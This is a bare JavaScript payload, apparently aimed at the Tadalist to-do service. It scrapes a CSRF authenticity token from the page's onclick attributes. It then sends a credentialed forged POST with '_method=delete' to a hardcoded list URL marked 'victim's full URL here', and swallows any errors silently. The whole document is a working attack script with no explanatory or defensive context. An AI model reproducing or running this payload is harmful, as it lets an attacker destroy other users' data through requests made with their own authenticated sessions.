(async () => {
  try {
    let token = null;
    for (const el of document.querySelectorAll('[onclick]')) {
      const onclick = el.getAttribute('onclick');
      if (!onclick) continue;
      const match = onclick.match(/setAttribute\(['"]name['"],\s*['"]authenticity_token['"]\);\s*.*setAttribute\(['"]value['"],\s*['"]([^'"]+)['"]\)/i);
      if (match) {
        token = match[1];
        break;
      }
    }
    if (!token) return;

    const targetUrl = 'https://123456.tadalist.com/lists/2356146';  // victim's full URL here

    const formData = new URLSearchParams();
    formData.append('_method', 'delete');
    formData.append('authenticity_token', token);

    await fetch(targetUrl, {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData.toString(),
      redirect: 'follow'
    });
  } catch {}
})();
